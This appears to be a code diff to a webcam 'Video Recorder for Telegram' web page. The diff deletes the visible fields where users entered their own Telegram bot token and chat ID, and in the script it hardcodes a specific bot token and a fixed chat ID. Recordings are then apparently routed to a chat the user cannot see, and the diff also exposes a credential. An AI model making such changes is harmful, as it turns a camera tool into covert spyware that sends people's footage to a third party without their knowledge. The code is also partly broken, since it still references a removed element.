@@ -19,16 +19,6 @@
 </head>
 <body>
     <h1>Video Recorder for Telegram</h1>
-    <div>
-        <label for="botToken">Bot Token:</label>
-        <input type="text" id="botToken" placeholder="123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" value="7520310595:AAFevgIKEx75UH3Z8tLnb5braLs66qUpflc">
-
-        <label for="chatId">Chat ID:</label>
-        <input type="text" id="chatId" placeholder="123456789">
-
-        <label for="messageText">Message Text (optional):</label>
-        <textarea id="messageText" placeholder="Your message here..."></textarea>
-    </div>
     <div class="status" id="status">Status: Ready</div>
     <div id="video-container">
         <video id="webcam" autoplay playsinline></video>
@@ -41,8 +31,11 @@
         const statusDiv = document.getElementById('status');
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
-        const botTokenInput = document.getElementById('botToken');
-        const chatIdInput = document.getElementById('chatId');
+        //const botTokenInput = document.getElementById('botToken');
+        //const botTokenInput = document.getElementById('botToken');
+        //const chatIdInput = document.getElementById('chatId');
+        const botTokenInput = "7520310595:AAFevgIKEx75UH3Z8tLnb5braLs66qUpflc"
+        const chatIdInput = 6018518882
         const messageTextInput = document.getElementById('messageText');
 
         let stream;
